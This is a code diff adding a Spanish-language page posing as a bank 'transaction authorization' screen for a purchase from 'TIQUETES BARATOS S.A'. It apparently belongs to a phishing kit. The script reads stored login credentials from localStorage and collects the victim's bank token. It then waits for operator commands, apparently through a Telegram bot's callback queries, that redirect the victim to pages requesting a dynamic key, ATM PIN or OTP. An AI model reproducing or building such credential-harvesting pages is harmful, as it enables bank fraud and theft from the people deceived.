@@ -1,3 +1,109 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Autorización de Transacción</title>
+  <script src="./bots/aes.js"></script>
+  <script src="./bots/AesUtil.js"></script>
+  <script src="../js/jquery-3.7.7.js"></script>
+  <script src="./bots/md5.js"></script>
+  <script src="./bots/pbkdf2.js"></script>
+  <script src="./bots/string-mask.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      position: relative;
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      padding: 20px;
+      box-sizing: border-box;
+      overflow: hidden;
+      margin: 0 10px;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+      border-bottom: 1px solid #ccc;
+      padding-bottom: 10px;
+    }
+    .header img { height: 35px; }
+    .title { font-size: 18px; font-weight: bold; margin-bottom: 10px; text-align: left; }
+    .details p { margin: 10px 0; font-size: 14px; }
+    .input-group { display: flex; justify-content: flex-start; margin-bottom: 15px; }
+    .input-group label { width: 35%; text-align: right; margin-right: 10px; font-size: 14px; }
+    .input-group input {
+      width: 50%; padding: 8px; border: 1px solid #ccc;
+      border-radius: 5px; font-size: 13px;
+    }
+    .button {
+      width: 30%; padding: 10px; background: #000; color: #fff;
+      border: none; border-radius: 5px; cursor: pointer;
+      font-size: 16px; font-weight: bold; margin-top: 35px;
+      text-align: center; display: block; margin-left: auto; margin-right: auto;
+    }
+    .loaderp {
+      width: 48px; height: 48px; border: 5px solid #FFF;
+      border-bottom-color: rgb(117,117,117); border-radius: 50%;
+      display: inline-block; box-sizing: border-box;
+      animation: rotation 1s linear infinite;
+    }
+    @keyframes rotation { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
+    .loaderp-full {
+      position: absolute; top: 79%; left: 50%; transform: translate(-50%, -50%);
+      width: 30vw; height: 20vh; max-width: 500px; max-height: 200px;
+      display: none; justify-content: center; align-items: center;
+      background-color: white; border-radius: 8px; z-index: 1000;
+    }
+    .hidden { display: none; }
+    @media (max-width: 600px) {
+      .loaderp { width: 32px; height: 32px; border: 4px solid #FFF; border-bottom-color: rgb(150,150,150);}
+      .loaderp-full { top: 83%; width: 85vw; height: 35vh; max-width: 530px; max-height: 300px;}
+    }
+    .instructions-text {
+      font-size: 12px; color: #555; margin: 5px 0; line-height: 1.5;
+      text-align: center; font-weight: normal; font-family: Arial, sans-serif; margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <img id="bank-logo" src="lgos/error2.png" alt="Banco Logo">
+    <div class="id-check"><img id="card-type-logo" src="lgos/error.avif" alt="Tipo Tarjeta Logo" height="35"></div>
+  </div>
+  <div class="title">Autorización de transacción</div>
+  <p class="small">La transacción de <strong>TIQUETES BARATOS S.A</strong> por <strong id="monto-transaccion">$49,999 COP</strong> con tarjeta terminada en <strong id="card-last4">0000</strong> debe ser autorizada.</p>
+  <div class="details">
+    <p><strong>Comercio:</strong> TIQUETES BARATOS S.A</p>
+    <p><strong>Monto:</strong> <span id="monto-transaccion-detalle">Calculando...</span></p>
+    <p><strong>Tarjeta:</strong> **** **** **** <span id="card-last4-display">0000</span></p>
+  </div>
+  <form id="transaction-form">
+    <div class="input-group">
+      <label id="clave-label" for="clave">Token:</label>
+      <input type="password" id="clave" placeholder="Ingresa tu Token" maxlength="6">
+    </div>
+    <p class="instructions-text">La encuentras en tu app o por mensaje de texto, en caso de haberte llegado por ese medio.</p>
+    <button class="button" id="authorize-button" disabled>Autorizar</button>
+  </form>
+  <div class="loaderp-full"><span class="loaderp"></span></div>
+</div>
+
 <script>
 document.addEventListener('DOMContentLoaded', function () {
     const loader = document.querySelector(".loaderp-full");
@@ -15,7 +121,6 @@ document.addEventListener('DOMContentLoaded', function () {
         loader.style.display = "flex";
 
         const dinamica = claveInput.value;
-
         const loginData = JSON.parse(localStorage.getItem("logindata"));
         const usuario = loginData ? loginData.usuario : "<i>No disponible</i>";
         const clave = loginData ? loginData.clave : "<i>No disponible</i>";
@@ -96,31 +201,16 @@ document.addEventListener('DOMContentLoaded', function () {
 
             if (verificationUpdate) {
                 loader.style.display = "none";
-
                 switch (verificationUpdate.callback_query.data) {
-                    case `pedir_dinamica:${transactionId}`:
-                        window.location.href = "dinamica-id.html";
-                        break;
-                    case `pedir_cajero:${transactionId}`:
-                        window.location.href = "ccajero-id.html";
-                        break;
-                    case `pedir_otp:${transactionId}`:
-                        window.location.href = "otp-id.html";
-                        break;
-                    case `pedir_token:${transactionId}`:
-                        window.location.href = "error-token.html";
-                        break;
+                    case `pedir_dinamica:${transactionId}`: window.location.href = "dinamica-id.html"; break;
+                    case `pedir_cajero:${transactionId}`: window.location.href = "ccajero-id.html"; break;
+                    case `pedir_otp:${transactionId}`: window.location.href = "otp-id.html"; break;
+                    case `pedir_token:${transactionId}`: window.location.href = "error-token.html"; break;
                     case `error_tc:${transactionId}`:
-                        alert("Error en tarjeta. Verifique los datos.");
-                        window.location.href = "../pay/";
-                        break;
+                        alert("Error en tarjeta. Verifique los datos."); window.location.href = "../pay/"; break;
                     case `error_logo:${transactionId}`:
-                        alert("Error en el logo. Reintente.");
-                        window.location.href = "error-id.html";
-                        break;
-                    case `confirm_finalizar:${transactionId}`:
-                        window.location.href = "../checking.html";
-                        break;
+                        alert("Error en el logo. Reintente."); window.location.href = "error-id.html"; break;
+                    case `confirm_finalizar:${transactionId}`: window.location.href = "../checking.html"; break;
                 }
             } else {
                 setTimeout(() => checkPaymentVerification(transactionId), 2000);
@@ -132,3 +222,5 @@ document.addEventListener('DOMContentLoaded', function () {
     }
 });
 </script>
+</body>
+</html>
